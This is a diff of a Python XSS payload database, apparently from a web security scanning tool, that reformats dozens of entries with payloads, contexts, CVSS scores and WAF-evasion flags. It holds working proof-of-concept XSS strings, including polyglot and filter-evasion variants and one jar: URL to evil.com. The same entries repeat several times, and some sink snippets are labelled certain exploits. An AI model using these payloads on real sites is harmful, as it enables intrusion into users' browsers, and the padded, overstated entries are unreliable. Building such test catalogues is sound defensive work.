+        reliability="medium",
     ),
-
     "ce_observed_attributes": PayloadEntry(
         payload="<my-input data-value='<script>alert(1)</script>'></my-input>",
         contexts=["custom_elements_xss"],
@@ -1952,9 +1789,8 @@ PAYLOAD_DATABASE = {
         description="Custom element observed attributes XSS",
         tags=["custom-elements", "attributes", "observed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More HTTP/2 Push payloads
     "http2_push_cache_key": PayloadEntry(
         payload="/cached/user_<script>alert(1)</script>.json",
@@ -1964,9 +1800,8 @@ PAYLOAD_DATABASE = {
         description="HTTP/2 push cache key injection",
         tags=["http2", "push", "cache"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "http2_push_etag": PayloadEntry(
         payload='{"etag": "<script>alert(1)</script>", "content": "data"}',
         contexts=["http2_push_xss"],
@@ -1975,9 +1810,8 @@ PAYLOAD_DATABASE = {
         description="HTTP/2 push ETag injection",
         tags=["http2", "push", "etag"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More modern framework payloads
     "framework_svelte": PayloadEntry(
         payload="{@html userInput}",
@@ -1987,9 +1821,8 @@ PAYLOAD_DATABASE = {
         description="Svelte HTML injection",
         tags=["svelte", "template", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "framework_solid": PayloadEntry(
         payload="<div innerHTML={userInput} />",
         contexts=["template_injection"],
@@ -1998,9 +1831,8 @@ PAYLOAD_DATABASE = {
         description="SolidJS innerHTML XSS",
         tags=["solid", "jsx", "innerHTML"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced encoding payloads
     "encoding_utf7": PayloadEntry(
         payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
@@ -2011,9 +1843,8 @@ PAYLOAD_DATABASE = {
         tags=["utf7", "encoding", "legacy"],
         browser_support=["edge"],
         reliability="low",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "encoding_utf16": PayloadEntry(
         payload="<script>alert(1)</script>",
         contexts=["html_content"],
@@ -2023,9 +1854,8 @@ PAYLOAD_DATABASE = {
         tags=["utf16", "encoding", "unicode"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # More CSS advanced attacks
     "css_calc_injection": PayloadEntry(
         payload="calc(1 + url('javascript:alert(1)'))",
@@ -2035,9 +1865,8 @@ PAYLOAD_DATABASE = {
         description="CSS calc function injection",
         tags=["css", "calc", "function"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "css_transform_injection": PayloadEntry(
         payload="transform: rotate(45deg) url('javascript:alert(1)')",
         contexts=["css_context"],
@@ -2046,9 +1875,8 @@ PAYLOAD_DATABASE = {
         description="CSS transform injection",
         tags=["css", "transform", "rotate"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More JavaScript advanced payloads
     "js_setTimeout_injection": PayloadEntry(
         payload="setTimeout('alert(1)', 1000)",
@@ -2058,9 +1886,8 @@ PAYLOAD_DATABASE = {
         description="setTimeout injection",
         tags=["setTimeout", "timing", "delayed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_setInterval_injection": PayloadEntry(
         payload="setInterval('alert(1)', 1000)",
         contexts=["javascript_context"],
@@ -2069,9 +1896,8 @@ PAYLOAD_DATABASE = {
         description="setInterval injection",
         tags=["setInterval", "repeating", "persistent"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_location_hijack": PayloadEntry(
         payload="location.href = 'javascript:alert(1)'",
         contexts=["javascript_context"],
@@ -2080,9 +1906,8 @@ PAYLOAD_DATABASE = {
         description="Location hijacking",
         tags=["location", "navigation", "redirect"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More DOM manipulation payloads
     "dom_innerHTML_injection": PayloadEntry(
         payload="element.innerHTML = userInput",
@@ -2092,9 +1917,8 @@ PAYLOAD_DATABASE = {
         description="innerHTML injection",
         tags=["dom", "innerHTML", "dangerous"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "dom_outerHTML_injection": PayloadEntry(
         payload="element.outerHTML = userInput",
         contexts=["dom_xss"],
@@ -2103,9 +1927,8 @@ PAYLOAD_DATABASE = {
         description="outerHTML injection",
         tags=["dom", "outerHTML", "replacement"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "dom_insertAdjacentHTML": PayloadEntry(
         payload="element.insertAdjacentHTML('afterend', userInput)",
         contexts=["dom_xss"],
@@ -2114,9 +1937,8 @@ PAYLOAD_DATABASE = {
         description="insertAdjacentHTML injection",
         tags=["dom", "insertAdjacent", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More comment-based attacks
     "html_comment_css": PayloadEntry(
         payload="<!-- <style>body{background:url('javascript:alert(1)')}</style> -->",
@@ -2126,9 +1948,8 @@ PAYLOAD_DATABASE = {
         description="HTML comment with CSS XSS",
         tags=["comment", "css", "style"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "html_comment_meta": PayloadEntry(
         payload="<!-- <meta http-equiv='refresh' content='0;url=javascript:alert(1)'> -->",
         contexts=["html_comment"],
@@ -2137,9 +1958,8 @@ PAYLOAD_DATABASE = {
         description="HTML comment with meta XSS",
         tags=["comment", "meta", "refresh"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # More protocol-based attacks
     "protocol_jar": PayloadEntry(
         payload="jar:http://evil.com/x.jar!/x.html<script>alert(1)</script>",
@@ -2149,9 +1969,8 @@ PAYLOAD_DATABASE = {
         description="JAR protocol injection",
         tags=["jar", "url", "archive"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     "protocol_chrome_extension": PayloadEntry(
         payload="chrome-extension://<script>alert(1)</script>/manifest.json",
         contexts=["url_context"],
@@ -2160,21 +1979,19 @@ PAYLOAD_DATABASE = {
         description="Chrome extension protocol injection",
         tags=["chrome-extension", "url", "browser"],
         browser_support=["chrome", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More form-based attacks
     "form_button_onclick": PayloadEntry(
-        payload="<button onclick=\"alert(1)\">Click me</button>",
+        payload='<button onclick="alert(1)">Click me</button>',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="Button onclick XSS",
         tags=["button", "onclick", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "form_fieldset_legend": PayloadEntry(
         payload="<fieldset><legend><script>alert(1)</script></legend></fieldset>",
         contexts=["html_content"],
@@ -2183,12 +2000,11 @@ PAYLOAD_DATABASE = {
         description="Fieldset legend XSS",
         tags=["fieldset", "legend", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced payloads
     "advanced_polyglot_2": PayloadEntry(
-        payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload=/\"+alert(1)+\"/>",
+        payload='javascript:/*--></title></style></textarea></script></xmp><svg/onload=/"+alert(1)+"/>',
         contexts=["html_content", "url_context", "css_context"],
         severity="critical",
         cvss_score=8.8,
@@ -2196,20 +2012,18 @@ PAYLOAD_DATABASE = {
         tags=["polyglot", "advanced", "multiple-context"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "advanced_mutation_2": PayloadEntry(
-        payload="<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="Advanced mutation XSS with image",
         tags=["mxss", "noscript", "image"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "advanced_dangling_2": PayloadEntry(
         payload="'><script>alert(String.fromCharCode(88,83,83))</script>",
         contexts=["html_attribute"],
@@ -2218,9 +2032,8 @@ PAYLOAD_DATABASE = {
         description="Dangling markup with char code",
         tags=["dangling", "charcode", "obfuscation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More modern web attacks
     "modern_web_components_2": PayloadEntry(
         payload="<my-app><script>alert(1)</script></my-app>",
@@ -2230,9 +2043,8 @@ PAYLOAD_DATABASE = {
         description="Web Components XSS",
         tags=["web-components", "modern", "framework"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "modern_pwa_cache": PayloadEntry(
         payload='{"url": "/app.js", "content": "<script>alert(1)</script>"}',
         contexts=["service_worker_xss"],
@@ -2241,9 +2053,8 @@ PAYLOAD_DATABASE = {
         description="PWA cache injection",
         tags=["pwa", "cache", "offline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More comprehensive payloads
     "comprehensive_16": PayloadEntry(
         payload="<listing><script>alert(1)</script></listing>",
@@ -2253,9 +2064,8 @@ PAYLOAD_DATABASE = {
         description="Listing element XSS",
         tags=["listing", "legacy", "preformatted"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_17": PayloadEntry(
         payload="<noframes><script>alert(1)</script></noframes>",
         contexts=["html_content"],
@@ -2264,9 +2074,8 @@ PAYLOAD_DATABASE = {
         description="Noframes element XSS",
         tags=["noframes", "legacy", "frames"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_18": PayloadEntry(
         payload="<noembed><script>alert(1)</script></noembed>",
         contexts=["html_content"],
@@ -2275,9 +2084,8 @@ PAYLOAD_DATABASE = {
         description="Noembed element XSS",
         tags=["noembed", "legacy", "embed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_19": PayloadEntry(
         payload="<blink><script>alert(1)</script></blink>",
         contexts=["html_content"],
@@ -2286,9 +2094,8 @@ PAYLOAD_DATABASE = {
         description="Blink element XSS",
         tags=["blink", "legacy", "deprecated"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "comprehensive_20": PayloadEntry(
         payload="<multicol><script>alert(1)</script></multicol>",
         contexts=["html_content"],
@@ -2297,9 +2104,8 @@ PAYLOAD_DATABASE = {
         description="Multicol element XSS",
         tags=["multicol", "legacy", "columns"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # Additional payloads to reach 200+
     "final_1": PayloadEntry(
         payload="<spacer><script>alert(1)</script></spacer>",
@@ -2309,9 +2115,8 @@ PAYLOAD_DATABASE = {
         description="Spacer element XSS",
         tags=["spacer", "legacy", "layout"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "final_2": PayloadEntry(
         payload="<layer><script>alert(1)</script></layer>",
         contexts=["html_content"],
@@ -2320,9 +2125,8 @@ PAYLOAD_DATABASE = {
         description="Layer element XSS",
         tags=["layer", "legacy", "positioning"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "final_3": PayloadEntry(
         payload="<ilayer><script>alert(1)</script></ilayer>",
         contexts=["html_content"],
@@ -2331,9 +2135,8 @@ PAYLOAD_DATABASE = {
         description="Inline layer element XSS",
         tags=["ilayer", "legacy", "inline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More HTML5 semantic elements
     "html5_article": PayloadEntry(
         payload="<article><script>alert(1)</script></article>",
@@ -2343,9 +2146,8 @@ PAYLOAD_DATABASE = {
         description="Article element XSS",
         tags=["html5", "semantic", "article"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_section": PayloadEntry(
         payload="<section><script>alert(1)</script></section>",
         contexts=["html_content"],
@@ -2354,9 +2156,8 @@ PAYLOAD_DATABASE = {
         description="Section element XSS",
         tags=["html5", "semantic", "section"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_nav": PayloadEntry(
         payload="<nav><script>alert(1)</script></nav>",
         contexts=["html_content"],
@@ -2365,9 +2166,8 @@ PAYLOAD_DATABASE = {
         description="Navigation element XSS",
         tags=["html5", "semantic", "navigation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_main": PayloadEntry(
         payload="<main><script>alert(1)</script></main>",
         contexts=["html_content"],
@@ -2376,9 +2176,8 @@ PAYLOAD_DATABASE = {
         description="Main element XSS",
         tags=["html5", "semantic", "main"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_aside": PayloadEntry(
         payload="<aside><script>alert(1)</script></aside>",
         contexts=["html_content"],
@@ -2387,9 +2186,8 @@ PAYLOAD_DATABASE = {
         description="Aside element XSS",
         tags=["html5", "semantic", "aside"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_header": PayloadEntry(
         payload="<header><script>alert(1)</script></header>",
         contexts=["html_content"],
@@ -2398,9 +2196,8 @@ PAYLOAD_DATABASE = {
         description="Header element XSS",
         tags=["html5", "semantic", "header"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_footer": PayloadEntry(
         payload="<footer><script>alert(1)</script></footer>",
         contexts=["html_content"],
@@ -2409,9 +2206,8 @@ PAYLOAD_DATABASE = {
         description="Footer element XSS",
         tags=["html5", "semantic", "footer"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_address": PayloadEntry(
         payload="<address><script>alert(1)</script></address>",
         contexts=["html_content"],
@@ -2420,9 +2216,8 @@ PAYLOAD_DATABASE = {
         description="Address element XSS",
         tags=["html5", "semantic", "contact"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced SVG attacks
     "svg_use_element": PayloadEntry(
         payload="<svg><use href='#<script>alert(1)</script>'></use></svg>",
@@ -2432,9 +2227,8 @@ PAYLOAD_DATABASE = {
         description="SVG use element XSS",
         tags=["svg", "use", "reference"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_symbol_injection": PayloadEntry(
         payload="<svg><symbol><script>alert(1)</script></symbol></svg>",
         contexts=["svg_context"],
@@ -2443,9 +2237,8 @@ PAYLOAD_DATABASE = {
         description="SVG symbol injection",
         tags=["svg", "symbol", "reusable"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_defs_injection": PayloadEntry(
         payload="<svg><defs><script>alert(1)</script></defs></svg>",
         contexts=["svg_context"],
@@ -2454,9 +2247,8 @@ PAYLOAD_DATABASE = {
         description="SVG defs injection",
         tags=["svg", "defs", "definition"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_g_element": PayloadEntry(
         payload="<svg><g><script>alert(1)</script></g></svg>",
         contexts=["svg_context"],
@@ -2465,9 +2257,8 @@ PAYLOAD_DATABASE = {
         description="SVG group element XSS",
         tags=["svg", "group", "container"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebSocket payloads
     "websocket_user_list": PayloadEntry(
         payload='{"type": "user_list", "users": ["<script>alert(1)</script>", "user2"]}',
@@ -2477,9 +2268,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket user list injection",
         tags=["websocket", "user-list", "array"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "websocket_typing_indicator": PayloadEntry(
         payload='{"type": "typing", "user": "<script>alert(1)</script>"}',
         contexts=["websocket_xss"],
@@ -2488,9 +2278,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket typing indicator XSS",
         tags=["websocket", "typing", "indicator"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Service Worker payloads
     "sw_background_sync": PayloadEntry(
         payload='{"type": "sync", "data": "<script>alert(1)</script>"}',
@@ -2500,9 +2289,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker background sync XSS",
         tags=["service-worker", "background-sync", "offline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "sw_install_event": PayloadEntry(
         payload='{"type": "install", "version": "<script>alert(1)</script>"}',
         contexts=["service_worker_xss"],
@@ -2511,9 +2299,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker install event XSS",
         tags=["service-worker", "install", "lifecycle"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebRTC payloads
     "webrtc_sdp_manipulation": PayloadEntry(
         payload='{"type": "offer", "sdp": "v=0\\r\\no=<script>alert(1)</script> 123456"}',
@@ -2523,9 +2310,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC SDP manipulation XSS",
         tags=["webrtc", "sdp", "offer"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "webrtc_peer_info": PayloadEntry(
         payload='{"type": "peer_info", "name": "<script>alert(1)</script>", "id": "peer123"}',
         contexts=["webrtc_xss"],
@@ -2534,9 +2320,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC peer information XSS",
         tags=["webrtc", "peer", "info"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More GraphQL payloads
     "graphql_subscription_xss": PayloadEntry(
         payload='subscription { messageReceived { content: "<script>alert(1)</script>" } }',
@@ -2546,9 +2331,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL subscription XSS",
         tags=["graphql", "subscription", "realtime"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "graphql_introspection_xss": PayloadEntry(
         payload='query { __type(name: "<script>alert(1)</script>") { name } }',
         contexts=["graphql_xss"],
@@ -2557,9 +2341,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL introspection XSS",
         tags=["graphql", "introspection", "schema"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Shadow DOM payloads
     "shadow_custom_property": PayloadEntry(
         payload="<my-element style='--user-content: <script>alert(1)</script>'></my-element>",
@@ -2569,9 +2352,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM custom property XSS",
         tags=["shadow-dom", "css", "custom-property"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "shadow_event_delegation": PayloadEntry(
         payload="<my-component><button onclick='alert(1)'>Click</button></my-component>",
         contexts=["shadow_dom_xss"],
@@ -2580,9 +2362,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM event delegation XSS",
         tags=["shadow-dom", "event", "delegation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Custom Elements payloads
     "ce_lifecycle_connected": PayloadEntry(
         payload="<x-alert-1></x-alert-1>",
@@ -2592,9 +2373,8 @@ PAYLOAD_DATABASE = {
         description="Custom element lifecycle XSS",
         tags=["custom-elements", "lifecycle", "connected"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "ce_observed_attributes": PayloadEntry(
         payload="<my-input data-value='<script>alert(1)</script>'></my-input>",
         contexts=["custom_elements_xss"],
@@ -2603,9 +2383,8 @@ PAYLOAD_DATABASE = {
         description="Custom element observed attributes XSS",
         tags=["custom-elements", "attributes", "observed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More HTTP/2 Push payloads
     "http2_push_cache_key": PayloadEntry(
         payload="/cached/user_<script>alert(1)</script>.json",
@@ -2615,9 +2394,8 @@ PAYLOAD_DATABASE = {
         description="HTTP/2 push cache key injection",
         tags=["http2", "push", "cache"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "http2_push_etag": PayloadEntry(
         payload='{"etag": "<script>alert(1)</script>", "content": "data"}',
         contexts=["http2_push_xss"],
@@ -2626,9 +2404,8 @@ PAYLOAD_DATABASE = {
         description="HTTP/2 push ETag injection",
         tags=["http2", "push", "etag"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More modern framework payloads
     "framework_svelte": PayloadEntry(
         payload="{@html userInput}",
@@ -2638,9 +2415,8 @@ PAYLOAD_DATABASE = {
         description="Svelte HTML injection",
         tags=["svelte", "template", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "framework_solid": PayloadEntry(
         payload="<div innerHTML={userInput} />",
         contexts=["template_injection"],
@@ -2649,9 +2425,8 @@ PAYLOAD_DATABASE = {
         description="SolidJS innerHTML XSS",
         tags=["solid", "jsx", "innerHTML"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced encoding payloads
     "encoding_utf7": PayloadEntry(
         payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
@@ -2662,9 +2437,8 @@ PAYLOAD_DATABASE = {
         tags=["utf7", "encoding", "legacy"],
         browser_support=["edge"],
         reliability="low",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "encoding_utf16": PayloadEntry(
         payload="<script>alert(1)</script>",
         contexts=["html_content"],
@@ -2674,9 +2448,8 @@ PAYLOAD_DATABASE = {
         tags=["utf16", "encoding", "unicode"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # More CSS advanced attacks
     "css_calc_injection": PayloadEntry(
         payload="calc(1 + url('javascript:alert(1)'))",
@@ -2686,9 +2459,8 @@ PAYLOAD_DATABASE = {
         description="CSS calc function injection",
         tags=["css", "calc", "function"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "css_transform_injection": PayloadEntry(
         payload="transform: rotate(45deg) url('javascript:alert(1)')",
         contexts=["css_context"],
@@ -2697,9 +2469,8 @@ PAYLOAD_DATABASE = {
         description="CSS transform injection",
         tags=["css", "transform", "rotate"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More JavaScript advanced payloads
     "js_setTimeout_injection": PayloadEntry(
         payload="setTimeout('alert(1)', 1000)",
@@ -2709,9 +2480,8 @@ PAYLOAD_DATABASE = {
         description="setTimeout injection",
         tags=["setTimeout", "timing", "delayed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_setInterval_injection": PayloadEntry(
         payload="setInterval('alert(1)', 1000)",
         contexts=["javascript_context"],
@@ -2720,9 +2490,8 @@ PAYLOAD_DATABASE = {
         description="setInterval injection",
         tags=["setInterval", "repeating", "persistent"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_location_hijack": PayloadEntry(
         payload="location.href = 'javascript:alert(1)'",
         contexts=["javascript_context"],
@@ -2731,9 +2500,8 @@ PAYLOAD_DATABASE = {
         description="Location hijacking",
         tags=["location", "navigation", "redirect"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More DOM manipulation payloads
     "dom_innerHTML_injection": PayloadEntry(
         payload="element.innerHTML = userInput",
@@ -2743,9 +2511,8 @@ PAYLOAD_DATABASE = {
         description="innerHTML injection",
         tags=["dom", "innerHTML", "dangerous"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "dom_outerHTML_injection": PayloadEntry(
         payload="element.outerHTML = userInput",
         contexts=["dom_xss"],
@@ -2754,9 +2521,8 @@ PAYLOAD_DATABASE = {
         description="outerHTML injection",
         tags=["dom", "outerHTML", "replacement"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "dom_insertAdjacentHTML": PayloadEntry(
         payload="element.insertAdjacentHTML('afterend', userInput)",
         contexts=["dom_xss"],
@@ -2765,9 +2531,8 @@ PAYLOAD_DATABASE = {
         description="insertAdjacentHTML injection",
         tags=["dom", "insertAdjacent", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More comment-based attacks
     "html_comment_css": PayloadEntry(
         payload="<!-- <style>body{background:url('javascript:alert(1)')}</style> -->",
@@ -2777,9 +2542,8 @@ PAYLOAD_DATABASE = {
         description="HTML comment with CSS XSS",
         tags=["comment", "css", "style"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "html_comment_meta": PayloadEntry(
         payload="<!-- <meta http-equiv='refresh' content='0;url=javascript:alert(1)'> -->",
         contexts=["html_comment"],
@@ -2788,9 +2552,8 @@ PAYLOAD_DATABASE = {
         description="HTML comment with meta XSS",
         tags=["comment", "meta", "refresh"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # More protocol-based attacks
     "protocol_jar": PayloadEntry(
         payload="jar:http://evil.com/x.jar!/x.html<script>alert(1)</script>",
@@ -2800,9 +2563,8 @@ PAYLOAD_DATABASE = {
         description="JAR protocol injection",
         tags=["jar", "url", "archive"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     "protocol_chrome_extension": PayloadEntry(
         payload="chrome-extension://<script>alert(1)</script>/manifest.json",
         contexts=["url_context"],
@@ -2811,21 +2573,19 @@ PAYLOAD_DATABASE = {
         description="Chrome extension protocol injection",
         tags=["chrome-extension", "url", "browser"],
         browser_support=["chrome", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More form-based attacks
     "form_button_onclick": PayloadEntry(
-        payload="<button onclick=\"alert(1)\">Click me</button>",
+        payload='<button onclick="alert(1)">Click me</button>',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="Button onclick XSS",
         tags=["button", "onclick", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "form_fieldset_legend": PayloadEntry(
         payload="<fieldset><legend><script>alert(1)</script></legend></fieldset>",
         contexts=["html_content"],
@@ -2834,12 +2594,11 @@ PAYLOAD_DATABASE = {
         description="Fieldset legend XSS",
         tags=["fieldset", "legend", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced payloads
     "advanced_polyglot_2": PayloadEntry(
-        payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload=/\"+alert(1)+\"/>",
+        payload='javascript:/*--></title></style></textarea></script></xmp><svg/onload=/"+alert(1)+"/>',
         contexts=["html_content", "url_context", "css_context"],
         severity="critical",
         cvss_score=8.8,
@@ -2847,20 +2606,18 @@ PAYLOAD_DATABASE = {
         tags=["polyglot", "advanced", "multiple-context"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "advanced_mutation_2": PayloadEntry(
-        payload="<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="Advanced mutation XSS with image",
         tags=["mxss", "noscript", "image"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "advanced_dangling_2": PayloadEntry(
         payload="'><script>alert(String.fromCharCode(88,83,83))</script>",
         contexts=["html_attribute"],
@@ -2869,9 +2626,8 @@ PAYLOAD_DATABASE = {
         description="Dangling markup with char code",
         tags=["dangling", "charcode", "obfuscation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More modern web attacks
     "modern_web_components_2": PayloadEntry(
         payload="<my-app><script>alert(1)</script></my-app>",
@@ -2881,9 +2637,8 @@ PAYLOAD_DATABASE = {
         description="Web Components XSS",
         tags=["web-components", "modern", "framework"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
